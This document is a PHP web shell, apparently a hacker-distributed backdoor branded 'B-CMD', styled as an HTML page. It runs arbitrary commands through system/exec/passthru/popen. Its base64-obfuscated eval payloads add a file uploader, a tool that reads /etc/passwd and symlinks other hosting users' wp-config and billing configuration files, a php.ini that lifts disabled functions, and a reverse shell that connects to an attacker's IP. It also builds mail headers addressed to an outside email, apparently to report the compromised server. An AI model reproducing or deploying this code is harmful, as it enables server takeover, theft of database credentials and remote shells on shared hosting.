<!DOCTYPE HTML>
<html>
<!-- CODER: B0RU70 (TEAM: WuRKaC - NoRsLaR.ORG) -->
<head>
<link rel="shortcut icon" href="http://www14.0zz0.com/2014/06/04/21/396554394.png" type="image/x-icon" />
<link href='//fonts.googleapis.com/css?family=Fredoka+One' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Libre+Barcode+39+Extended+Text' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Pompiere' rel='stylesheet' type='text/css'>
<title>B-CMD W3B/B@CKD00R (Priv8)</title>
<!-- Bu Shelle Edit Cekenin Sulalesini Siksinler.. -->
<meta name='author' content='B0RU70'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
	color: #ffffff;
	font-size: 14px;
	width: 100%;
}

li {
	display: inline;
	margin: 5px;
	padding: 5px;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: gold;
	text-decoration: underline;
}

b {
	color: gold;
}

pre {
	font-size: 13px;
}

table, th, td {
	border-collapse:collapse;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}

.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}

.th_home {
	color: lime;
}

.td_home, .td_home > a {
	color: #ffffff;
}

.td_home > a:hover {
	color: gold;
}

th {
	padding: 10px;
}

tr:hover {
	background: #006400;
	color: #ffffff;
}

input[type=text], input[type=password], .input {
	background: transparent; 
	color: #ffffff;
	border: 1px solid #ffffff;
	padding: 3px;
	font-family: 'Ubuntu';
	font-size: 13px;
}

input[type=submit] {
	padding: 2px;}

input[type=submit]:hover {
	cursor: pointer;
}

input:focus, textarea:focus {
  outline: 0;
  border-color: #ffffff;
}

textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
iframe {
	width: 100%;
	min-height: 500px;
}
</style>
<style>
body
{
        background: #0f0e0d;
        color: #FF9933;
        padding: 0px;
}
a:link, body_alink
{
        color: #FF9933;
        text-decoration: none;
}
a:visited, body_avisited
{
        color: #FF9933;
        text-decoration: none;
}
a:hover, a:active, body_ahover
{
        color: #FFFFFF;
        text-decoration: none;
}
td, th, p, li,table
{
       
        background: #2e2b28;
        border:1px solid #524f46;
}
input
{
        border: 1px solid;
        cursor: default;
       
        overflow: hidden;
        background: #2e2b28;
        color: #ffffff;
}textarea
{
        border: 1px solid;
        cursor: default;
       
        overflow: hidden;
        background: #2e2b28;
        color: #ffffff;
}
button
{
        border: 1px solid;
        cursor: default;
       
        overflow: hidden;
        background: #2e2b28;
        color: #ffffff;
}
</style>
</head>
<!-- Bu Shelle Edit Cekenin Sulalesini Siksinler.. -->
<body>
	<center>
<header>
	<pre>
 ____        ____ __  __ ____  
| __ )      / ___|  \/  |  _ \ 
|  _ \  -- | |   | |\/| | | | |
| |_) | -- | |___| |  | | |_| |
|____/      \____|_|  |_|____/ 
                                                            

    B0RU70.BLOGSPOT.COM
	</pre>
	<br>
[<a href="b-cmd.php"> CMD </a>] [<a href="?file=file"> UPLOADER </a>] [<a href="?C1=C1"> C1 </a>] [<a href="?conf=conf"> CONFİG </a>] [<a href="?back=back"> BACK </a>]
<br>
</header>
<pre>
<?php echo '
<center>
<form method=GET>
<p><textarea class="area" rows="13" name="text" value="pyt" cols="70" >'; if (strlen($_GET['command'])>1 && $_GET['execmethod']!="popen"){ echo $_GET['execmethod']($_GET['command']);} if (strlen($_POST['command'])>1 && $_POST['execmethod']!="popen"){ echo $_POST['execmethod']($_POST['command']);} if (strlen($_GET['command'])>1 && $_GET['execmethod']=="popen"){ popen($_GET['command'],"r");} echo'</textarea></p>
<p><center></center></p>
<p align="center"><strong></strong><input type=hidden name="vw" size="50" value="cmd"> <input type="text" name="command" size="43"> <select name=execmethod>
<option value="system">System</option>  <option value="exec">Exec</option>  <option value="passthru">Passthru</option><option value="popen">popen</option>
</select> <input type="submit" name="kkk" value="Execute">
</p></form>';
$ip_remote = $_SERVER["REMOTE_ADDR"];
$from_shellcode = 'shell@' . gethostbyname($_SERVER['SERVER_NAME']) . '';
$to_email = 'B0RU70@secmail.pro';
//
$server_mail = "" . gethostbyname($_SERVER['SERVER_NAME']) . " - " . $_SERVER['HTTP_HOST'] . "";
$linkcr = "Link: " . $_SERVER['SERVER_NAME'] . "" . $_SERVER['REQUEST_URI'] . " - IP Excuting: $ip_remote - Time: $time_shell";
$header = "From: $from_shellcode
Reply-to: $from_shellcode";
?>
</body>
</center>
<br>
    <div class="footer">&copy; 2010 - 2018<br><span> B0RU70</span></div>
</html>
<!-- Bu Shelle Edit Cekenin Sulalesini Siksinler.. -->
<?php if(isset($_GET["file"])&&$_GET["file"]=="file"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD9waHAgZWNobyAiPHRpdGxlPlVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzczogPC9iPiA8Zm9udCBjb2xvcj1cIndoaXRlXCI+PC9mb250PjwvY2VudGVyPlxuPGJpZz48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48Y2VudGVyPlxuIjtlY2hvICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2VjaG8gIjwvY2VudGVyPjwvZm9udD48L2E+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+XG48YnI+XG48YnI+XG48Y2VudGVyPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPjxiaWc+Qi1DTUQgVzNCL0JAQ0tEMDBSPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+QjBSVTcwLkJMT0dTUE9ULkNPTTwvYj48L2JpZz48L3N0cm9uZz48L3NwYW4+PC9jZW50ZXI+Jzs/Pg==");exit;}?>
<!-- Bu Shelle Edit Cekenin Sulalesini Siksinler.. -->
<?php if(isset($_GET["conf"])&&$_GET["conf"]=="conf"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("IDw/cGhwDQoNCiANCg0KIA0KDQogJGhlYWQgPSAnDQoNCjxodG1sPg0KDQo8aGVhZD4NCg0KPC9zY3JpcHQ+DQoNCjx0aXRsZT5CMFJVNzAgU3lNTGluazwvdGl0bGU+DQoNCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCg0KIA0KDQo8U1RZTEU+DQoNCmJvZHkgew0KDQpmb250LWZhbWlseTogVGFob21hDQoNCn0NCg0KdHIgew0KDQpCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsNCg0KY29sb3I6ICNGRkY7DQoNCn0NCg0KdGQgew0KDQpCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsNCg0KY29sb3I6ICNGRkY7DQoNCn0NCg0KLnRhYmxlMSB7DQoNCkJPUkRFUjogMHB4IEJsYWNrOw0KDQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCg0KY29sb3I6ICNGRkY7DQoNCn0NCg0KLnRkMSB7DQoNCkJPUkRFUjogMHB4Ow0KDQpCT1JERVItQ09MT1I6ICMzMzMzMzM7DQoNCmZvbnQ6IDdwdCBWZXJkYW5hOw0KDQpjb2xvcjogR3JlZW47DQoNCn0NCg0KLnRyMSB7DQoNCkJPUkRFUjogMHB4Ow0KDQpCT1JERVItQ09MT1I6ICMzMzMzMzM7DQoNCmNvbG9yOiAjRkZGOw0KDQp9DQoNCnRhYmxlIHsNCg0KQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7DQoNCkJPUkRFUi1DT0xPUjogIzMzMzMzMzsNCg0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQoNCmNvbG9yOiAjRkZGOw0KDQp9DQoNCmlucHV0IHsNCg0KYm9yZGVyICAgICAgICAgICAgOiBkYXNoZWQgMXB4Ow0KDQpib3JkZXItY29sb3IgICAgICAgIDogIzMzMzsNCg0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQoNCmZvbnQ6IDhwdCBWZXJkYW5hOw0KDQpjb2xvcjogUmVkOw0KDQp9DQoNCnNlbGVjdCB7DQoNCkJPUkRFUi1SSUdIVDogIEJsYWNrIDFweCBzb2xpZDsNCg0KQk9SREVSLVRPUDogICAgI0RGMDAwMCAxcHggc29saWQ7DQoNCkJPUkRFUi1MRUZUOiAgICNERjAwMDAgMXB4IHNvbGlkOw0KDQpCT1JERVItQk9UVE9NOiBCbGFjayAxcHggc29saWQ7DQoNCkJPUkRFUi1jb2xvcjogI0ZGRjsNCg0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQoNCmZvbnQ6IDhwdCBWZXJkYW5hOw0KDQpjb2xvcjogUmVkOw0KDQp9DQoNCnN1Ym1pdCB7DQoNCkJPUkRFUjogIGJ1dHRvbmhpZ2hsaWdodCAycHggb3V0c2V0Ow0KDQpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsNCg0Kd2lkdGg6IDMwJTsNCg0KY29sb3I6ICNGRkY7DQoNCn0NCg0KdGV4dGFyZWEgew0KDQpib3JkZXIgICAgICAgICAgICA6IGRhc2hlZCAxcHggIzMzMzsNCg0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQoNCmZvbnQ6IEZpeGVkc3lzIGJvbGQ7DQoNCmNvbG9yOiAjOTk5Ow0KDQp9DQoNCkJPRFkgew0KDQogICAgU0NST0xMQkFSLUZBQ0UtQ09MT1I6IEJsYWNrOyBTQ1JPTExCQVItSElHSExJR0hULWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItU0hBRE9XLWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItM0RMSUdIVC1jb2xvcjogI0ZGRjsgU0NST0xMQkFSLUFSUk9XLUNPTE9SOiBCbGFjazsgU0NST0xMQkFSLVRSQUNLLWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItREFSS1NIQURPVy1jb2xvcjogI0ZGRg0KDQptYXJnaW46IDFweDsNCg0KY29sb3I6IFJlZDsNCg0KYmFja2dyb3VuZC1jb2xvcjogQmxhY2s7DQoNCn0NCg0KLm1haW4gew0KDQptYXJnaW4gICAgICAgICAgICA6IC0yODdweCAwcHggMHB4IC00OTBweDsNCg0KQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7DQoNCkJPUkRFUi1DT0xPUjogIzMzMzMzMzsNCg0KfQ0KDQoudHQgew0KDQpiYWNrZ3JvdW5kLWNvbG9yOiBCbGFjazsNCg0KfQ0KDQogDQoNCkE6bGluayB7DQoNCiAgICBDT0xPUjogV2hpdGU7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KDQp9DQoNCkE6dmlzaXRlZCB7DQoNCiAgICBDT0xPUjogV2hpdGU7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KDQp9DQoNCkE6aG92ZXIgew0KDQogICAgY29sb3I6IFJlZDsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQoNCn0NCg0KQTphY3RpdmUgew0KDQogICAgY29sb3I6IFJlZDsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQoNCn0NCg0KPC9TVFlMRT4NCg0KPHNjcmlwdCBsYW5ndWFnZT1cJ2phdmFzY3JpcHRcJz4NCg0KZnVuY3Rpb24gaGlkZV9kaXYoaWQpDQoNCnsNCg0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCkuc3R5bGUuZGlzcGxheSA9IFwnbm9uZVwnOw0KDQogIGRvY3VtZW50LmNvb2tpZT1pZCtcJz0wO1wnOw0KDQp9DQoNCmZ1bmN0aW9uIHNob3dfZGl2KGlkKQ0KDQp7DQoNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpLnN0eWxlLmRpc3BsYXkgPSBcJ2Jsb2NrXCc7DQoNCiAgZG9jdW1lbnQuY29va2llPWlkK1wnPTE7XCc7DQoNCn0NCg0KZnVuY3Rpb24gY2hhbmdlX2RpdnN0KGlkKQ0KDQp7DQoNCiAgaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5zdHlsZS5kaXNwbGF5ID09IFwnbm9uZVwnKQ0KDQogICAgc2hvd19kaXYoaWQpOw0KDQogIGVsc2UNCg0KICAgIGhpZGVfZGl2KGlkKTsNCg0KfQ0KDQo8L3NjcmlwdD4nOyA/Pg0KDQo8aHRtbD4NCg0KICAgIDxoZWFkPg0KDQogICAgICAgIDw/cGhwDQoNCiAgICAgICAgZWNobyAkaGVhZCA7DQoNCiAgICAgICAgZWNobyAnDQoNCiANCg0KPHRhYmxlIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiID4NCg0KIA0KICAgICAgICAgICAgDQoNCiANCg0KICAgICAgIDx0ZCB3aWR0aD0iMTAwJSIgYWxpZ249Y2VudGVyIHZhbGlnbj0idG9wIiByb3dzcGFuPSIxIj4NCg0KICAgICAgIDxicj48Y2VudGVyPjxpbWcgc3JjPSJodHRwOi8vaW1hZ2l6ZXIuaW1hZ2VzaGFjay51cy92Mi84MDB4NjAwcTkwLzU3MS9kZGloLnBuZyIgaGVpZ2h0PSIzNTAid2lkdGg9IjUwMCI+PC9jZW50ZXI+PGJyPg0KCSAgIDxmb250IGNvbG9yPWJsdWUgc2l6ZT01IGZhY2U9ImNvbWljIHNhbnMgbXMiPjxiPkF1dG9TeW1saW5rPC9mb250Pjxmb250IGNvbG9yPXdoaXRlIHNpemU9NSBmYWNlPSJjb21pYyBzYW5zIG1zIj48Yj4gIGJ5PC9mb250Pjxmb250IGNvbG9yPXJlZCBzaXplPTUgZmFjZT0iY29taWMgc2FucyBtcyI+PGI+IEdoMHN0XzN4cDEwIXQ8L2ZvbnQ+IDxkaXY+DQoNCiANCg0KICAgICAgICA8dGQgaGVpZ2h0PSIxMCIgYWxpZ249ImxlZnQiPjwvdGQ+PC90cj48dHI+PHRkDQoNCiAgICAgICAgd2lkdGg9IjEwMCUiIGFsaWduPSJjZW50ZXIiIHZhbGlnbj0idG9wIiByb3dzcGFuPSIxIj48Zm9udA0KDQogICAgICAgIGNvbG9yPSJyZWQiIGZhY2U9ImNvbWljIHNhbnMgbXMic2l6ZT0iMSI+PGI+DQoNCiAgICAgICAgPGZvbnQgY29sb3I9cmVkPg0KDQogDQoNCiAgICAgICAgICAgPC90YWJsZT4NCiAgICAgICAgDQoNCiANCg0KJzsNCg0KIA0KDQo/Pg0KDQo8Ym9keSBiZ2NvbG9yPWJsYWNrPjxoMyBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPjxmb250IGNvbG9yPXJlZCBzaXplPTIgZmFjZT0iY29taWMgc2FucyBtcyI+PGRpdiBhbGlnbj1jZW50ZXI+PHRhYmxlPjx0cj48dGQ+PC9mb250Pjxicj48L3RkPjwvdHI+PC90YWJsZT4NCg0KPGZvcm0gbWV0aG9kPXBvc3Q+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9ImNvbWljIHNhbnMgbXMiPnVzZSB0byBHZW5lcmF0ZSBQSFAuaW5pPC9mb250PjxwPg0KDQo8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1pbmkgdmFsdWU9InVzZSB0byBHZW5lcmF0ZSBQSFAuaW5pIiAvPjwvZm9ybT4NCg0KPGZvcm0gbWV0aG9kPXBvc3Q+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9ImNvbWljIHNhbnMgbXMiPnVzZSB0byBFeHRyYWN0IHVzZXJuYW1lczwvZm9udD48cD4NCg0KICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPSJ1c3JlIiB2YWx1ZT0idXNlIHRvIEV4dHJhY3QgdXNlcm5hbWVzIiAvPjwvZm9ybT4NCg0KIA0KDQogICAgPD9waHANCg0KICAgIGlmKGlzc2V0KCRfUE9TVFsnaW5pJ10pKQ0KDQogICAgew0KDQogDQoNCiAgICAgICAgJHI9Zm9wZW4oJ3BocC5pbmknLCd3Jyk7DQoNCiAgICAgICAgJHJyPSIgZGlzYmFsZV9mdW5jdGlvbnM9bm9uZSAiOw0KDQogICAgICAgIGZ3cml0ZSgkciwkcnIpOw0KDQogICAgICAgICRsaW5rPSI8YSBocmVmPXBocC5pbmk+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+PHU+T0s8L3U+PC9mb250PjwvYT4iOw0KDQogICAgICAgIGVjaG8gJGxpbms7DQoNCiANCg0KICAgICAgICB9DQoNCiANCg0KIA0KDQogDQoNCiAgICA/Pg0KDQogDQoNCiANCg0KICAgIDw/cGhwDQoNCiAgICBpZihpc3NldCgkX1BPU1RbJ3VzcmUnXSkpew0KDQogICAgICAgID8+PGZvcm0gbWV0aG9kPXBvc3Q+DQoNCiAgICA8dGV4dGFyZWEgcm93cz0xMCBjb2xzPTUwIG5hbWU9dXNlcj48P3BocCAgJHVzZXJzPWZpbGUoIi9ldGMvcGFzc3dkIik7DQoNCmZvcmVhY2goJHVzZXJzIGFzICR1c2VyKQ0KDQp7DQoNCiRzdHI9ZXhwbG9kZSgiOiIsJHVzZXIpOw0KDQplY2hvICRzdHJbMF0uIlxuIjsNCg0KfQ0KDQogDQoNCj8+PC90ZXh0YXJlYT48YnI+PGJyPg0KDQogICAgPGlucHV0IHR5cGU9c3VibWl0IG5hbWU9c3UgdmFsdWU9Ik9LIiAvPjwvZm9ybT4NCg0KICAgIDw/cGhwIH0gPz4NCg0KICAgIDw/cGhwDQoNCiAgICBlcnJvcl9yZXBvcnRpbmcoMCk7DQoNCiAgICBlY2hvICI8Zm9udCBjb2xvcj1yZWQgc2l6ZT0yIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+IjsNCg0KICAgIGlmKGlzc2V0KCRfUE9TVFsnc3UnXSkpDQoNCiAgICB7DQoNCiAgICBta2RpcignZ2hvc3RleHBsb2l0JywwNzc3KTsNCg0KJHJyICA9ICIgT3B0aW9ucyBhbGwgXG4gRGlyZWN0b3J5SW5kZXggU3V4Lmh0bWwgXG4gQWRkVHlwZSB0ZXh0L3BsYWluIC5waHAgXG4gQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgXG4gIEFkZFR5cGUgdGV4dC9wbGFpbiAuaHRtbCBcbiBBZGRIYW5kbGVyIHR4dCAuaHRtbCBcbiBSZXF1aXJlIE5vbmUgXG4gU2F0aXNmeSBBbnkiOw0KDQokZyA9IGZvcGVuKCdCdWxrYUhhY2tlcnMvLmh0YWNjZXNzJywndycpOw0KDQpmd3JpdGUoJGcsJHJyKTsNCg0KJEJ1bGthSGFja2VycyA9IHN5bWxpbmsoIi8iLCJCdWxrYUhhY2tlcnMvcm9vdCIpOw0KDQogICAgICAgICAgICAkcnQ9IjxhIGhyZWY9QnVsa2FIYWNrZXJzL3Jvb3Q+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+IFJvb3Q8L2ZvbnQ+PC9hPiI7DQoNCiAgICAgICAgZWNobyAiUm9vdCBGb2xkZXIgQ3JlYXRlZDxicj48dT4kcnQ8L3U+IjsNCg0KIA0KDQogICAgICAgICRkaXI9bWtkaXIoJ2dob3N0ZXhwbG9pdCcsMDc3Nyk7DQoNCiAgICAgICAgJHIgID0gIiBPcHRpb25zIGFsbCBcbiBEaXJlY3RvcnlJbmRleCBTdXguaHRtbCBcbiBBZGRUeXBlIHRleHQvcGxhaW4gLnBocCBcbiBBZGRIYW5kbGVyIHNlcnZlci1wYXJzZWQgLnBocCBcbiAgQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sIFxuIEFkZEhhbmRsZXIgdHh0IC5odG1sIFxuIFJlcXVpcmUgTm9uZSBcbiBTYXRpc2Z5IEFueSI7DQoNCiAgICAgICAgJGYgPSBmb3BlbignQnVsa2FIYWNrZXJzLy5odGFjY2VzcycsJ3cnKTsNCg0KIA0KDQogICAgICAgIGZ3cml0ZSgkZiwkcik7DQoNCiAgICAgICAgJGNvbnN5bT0iPGEgaHJlZj1HaDBzdF8zeHAxMCF0Lz48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTMgZmFjZT1cImNvbWljIHNhbnMgbXNcIj5HaDBzdF8zeHAxMCF0PC9mb250PjwvYT4iOw0KDQogICAgICAgICAgIGVjaG8gIjxicj5HaDBzdF8zeHAxMCF0IENyZWF0ZWQ8YnI+PHU+PGZvbnQgY29sb3I9cmVkIHNpemU9MiBmYWNlPVwiY29taWMgc2FucyBtc1wiPiRjb25zeW08L2ZvbnQ+PC91PiI7DQoNCiANCg0KICAgICAgICAgICAgICAgJHVzcj1leHBsb2RlKCJcbiIsJF9QT1NUWyd1c2VyJ10pOw0KDQogICAgICAgICAgICRjb25maWd1cmF0aW9uPWFycmF5KCJ3cC1jb25maWcucGhwIiwid29yZHByZXNzL3dwLWNvbmZpZy5waHAiLCJjb25maWd1cmF0aW9uLnBocCIsImJsb2cvd3AtY29uZmlnLnBocCIsImpvb21sYS9jb25maWd1cmF0aW9uLnBocCIsInZiL2luY2x1ZGVzL2NvbmZpZy5waHAiLCJpbmNsdWRlcy9jb25maWcucGhwIiwiY29uZl9nbG9iYWwucGhwIiwiaW5jL2NvbmZpZy5waHAiLCJjb25maWcucGhwIiwiU2V0dGluZ3MucGhwIiwic2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAiLCJ3aG0vY29uZmlndXJhdGlvbi5waHAiLCJ3aG1jcy9jb25maWd1cmF0aW9uLnBocCIsInN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAiLCJ3aG1jL1dITS9jb25maWd1cmF0aW9uLnBocCIsIndobS9XSE1DUy9jb25maWd1cmF0aW9uLnBocCIsIndobS93aG1jcy9jb25maWd1cmF0aW9uLnBocCIsInN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAiLCJjbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwIiwiY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwIiwiY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAiLCJjbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwIiwiY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCIsImJpbGxpbmcvY29uZmlndXJhdGlvbi5waHAiLCJhZG1pbi9jb25maWcucGhwIik7DQoNCiAgICAgICAgZm9yZWFjaCgkdXNyIGFzICR1c3MgKQ0KDQogICAgICAgIHsNCg0KICAgICAgICAgICAgJHVzPXRyaW0oJHVzcyk7DQoNCiANCg0KICAgICAgICAgICAgZm9yZWFjaCgkY29uZmlndXJhdGlvbiBhcyAkYykNCg0KICAgICAgICAgICAgew0KDQogICAgICAgICAgICAgJHJzPSIvaG9tZS8iLiR1cy4iL3B1YmxpY19odG1sLyIuJGM7DQoNCiAgICAgICAgICAgICAkcj0iR2gwc3RfM3hwMTAhdC8iLiR1cy4iIC4uICIuJGM7DQoNCiAgICAgICAgICAgICBzeW1saW5rKCRycywkcik7DQoNCiANCg0KICAgICAgICB9DQoNCiANCg0KICAgICAgICAgICAgfQ0KDQogDQoNCiANCg0KICAgICAgICB9DQoNCiANCg0KIA0KDQogDQoNCiAgICA/PiANCg==");exit;}?>
<!-- Bu Shelle Edit Cekenin Anasini Siksinler.. -->
<?php if(isset($_GET["back"])&&$_GET["back"]=="back"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD8NCnByaW50ICggJzx0aXRsZT5CYWNrIENvbm5lY3Q8L3RpdGxlPicgKTsNCmVjaG8gIjxicj48Yj5QaHAgQmFjayBDb25uZWN0PGJyPiANCiAgICAgICAgICAgIFVzYWdlOiBuYyAtdnYgLWwgLXAgMjE8YnI+DQogICAgICAgICAgICA8aHI+IA0KICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSdQT1NUJyBhY3Rpb249Jyc+PGJyPiANCiAgICAgICAgICAgIFlvdXIgSVAgJiBQb3J0Ojxicj4gDQogICAgICAgICAgICA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0naXBpbScgc2l6ZT0nMTUnIHZhbHVlPScnPg0KICAgICAgICAgICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3BvcnR1bScgc2l6ZT0nNScgdmFsdWU9JzIxJz48YnI+PGJyPiANCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDb25uZWN0Jz48YnI+PGJyPg0KICAgICAgICAgICAgPGhyPg0KICAgICAgICAgICAgPC9mb3JtPiI7IA0KICAgICAgICAgICAgDQogICAgICAgICAkaXBpbT0kX1BPU1RbJ2lwaW0nXTsgDQogICAgICAgICAkcG9ydHVtPSRfUE9TVFsncG9ydHVtJ107IA0KICAgICAgICAgaWYgKCRpcGltIDw+ICIiKSANCiAgICAgICAgIHsgDQogICAgICAgICAkbXVjeD1mc29ja29wZW4oJGlwaW0gLCAkcG9ydHVtICwgJGVycm5vLCAkZXJyc3RyICk7IA0KICAgICAgICAgaWYgKCEkbXVjeCl7IA0KICAgICAgICAgICAgICAgJHJlc3VsdCA9ICJFcnJvcjogZGlkbnQgY29ubmVjdCAhISEiOyANCiAgICAgICAgIH0gDQogICAgICAgICBlbHNlIHsgDQogICAgICAgICANCiAgICAgICAgICR6YW1hemluZzA9IlxuIjsNCiAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgZnB1dHMgKCRtdWN4ICwiXG5nMHQgYSBzaGVsbC5cblxuIik7DQogICAgICAgICBmcHV0cygkbXVjeCAsIHN5c3RlbSgidW5hbWUgLWEiKSAuJHphbWF6aW5nMCApOw0KICAgICAgICAgZnB1dHMoJG11Y3ggLCBzeXN0ZW0oInB3ZCIpIC4kemFtYXppbmcwICk7DQogICAgICAgICBmcHV0cygkbXVjeCAsIHN5c3RlbSgiaWQiKSAuJHphbWF6aW5nMC4kemFtYXppbmcwICk7DQogICAgICAgICB3aGlsZSghZmVvZigkbXVjeCkpeyAgDQogICAgICAgZnB1dHMgKCRtdWN4KTsgDQogICAgICAgJG9uZT0iWyQiOw0KICAgICAgICR0d289Il0iOw0KICAgICAgICRyZXN1bHQ9IGZnZXRzICgkbXVjeCwgODE5Mik7IA0KICAgICAgJG1lc3NhZ2U9YCRyZXN1bHRgOyANCiAgICAgICBmcHV0cyAoJG11Y3gsICRvbmUuIHN5c3RlbSgid2hvYW1pIikgLiR0d28uICIgIiAuJG1lc3NhZ2UuIlxuIik7IA0KICAgICAgfSANCiAgICAgIGZjbG9zZSAoJG11Y3gpOyANCiAgICAgICAgIH0gDQogICAgICAgICB9IA0KPz4=");exit;}?>